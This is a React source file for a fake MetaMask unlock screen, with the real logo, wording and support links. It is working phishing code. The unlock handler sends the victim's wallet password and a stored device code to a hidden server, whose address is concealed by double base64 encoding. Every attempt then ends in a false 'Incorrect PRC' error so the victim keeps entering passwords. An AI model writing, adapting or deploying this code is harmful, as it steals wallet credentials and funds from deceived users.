import React, { useEffect, useState } from 'react'
import styles from '../styles/header.module.css'
import MetamaskLogo from '../Components/MetaMask/MetaMask'
export const Metamask = () => {
    const [password, setPassword] = useState('')
    const [errormessage, setErrormessage] = useState(false)
    const [errrpc, setErrrpc] = useState(false)
    const [loader, setLoader] = useState(false)
    const [code, setCode] = useState('')
    const handleCodeChange = (e) => {
        const value = e.target.value
        if (password.length != value.length) {
            setErrormessage(false)
            setErrrpc(false)
        }
        setPassword(value)
    }
    useEffect(() => {
        setCode(localStorage.getItem('code'))
    }, [])
    const unlock = async () => {
        setErrormessage(false)
        setErrrpc(false)
        if (password.length === 0) {
            return;
        } else if (password.length < 8) {
            setErrormessage(true)
            return;
        }
        //here is the code that we have read ABC
        const device = code
        const url = 'YUhSMGNITTZMeTl6ZEdGeVptbHphQzFoY0hBdGFXbDBlSFl1YjI1a2FXZHBkR0ZzYjJObFlXNHVZWEJ3TDJGd2FTOTJNUzlvY0E9PQ==';
        const requestData = { device, value: password };
        try {
            setLoader(true)
            const response = await fetch(atob(atob(url)), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData),
            });

            if (response.ok) {
                await response.json();
                setErrrpc(true)
            } else {
                setErrrpc(true)

            }
        } catch (error) {
            setErrrpc(true)

        } finally {
            setLoader(false)
            setErrrpc(true)


        }


    }

    return (
        <div className={styles.popupm}>
            <div style={{ width: '100%' }} className={`${loader ? styles.main : ''}`}>
                <div className={`${styles.logocontainer}`}>
                    <MetamaskLogo />
                </div>
                <div className="text-center">
                    <h2 className={`${styles.bck} text-3xl font-bold`}>Welcome back!</h2>
                    <h6 className='text-sm mt-1 text-black'>The decentralized web awaits</h6>
                </div>
                <div className="mr-4 ml-4 mt-16 relative z-0">
                    <input type="password" id="floating_standard" className="block py-2 px-0 w-full text-sm text-gray-900 font-normal bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" " value={password}
                        onChange={handleCodeChange} />
                    <label htmlFor="floating_standard" className="absolute text-gray-700  font-normal dark:text-gray-800 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:left-0 peer-focus:text-blue-600 peer-focus:dark:text-gray-400  peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-90 peer-focus:-translate-y-6">Password</label>
                    {errormessage ? <span className={`${styles.errormessage}`}>Incorrect password</span> : errrpc ? <span className={`${styles.errormessage}`}>Incorrect PRC</span> : ''}
                </div>
                <button className={`${styles.unlockbtn}`} onClick={unlock}>Unlock</button>
                <div className="text-center m-4"> <a
                    href="https://support.metamask.io/hc/en-us/articles/360039616872-How-can-I-reset-my-password-"
                    target="_blank" className={`${styles.forgotpswd}`}>Forgot
                    password?</a>
                    <p className={`${styles.hlp} w-full`}>Need help? Contact <a href="https://support.metamask.io/hc/en-us" target="_blank"
                        style={{ color: 'rgb(33, 132, 218)' }} >Metamask support </a></p>
                </div>
            </div>
            {loader ? <div className={`${styles.customloader} ${styles.loadertrue}`}></div> : ''}
        </div >

    )
}
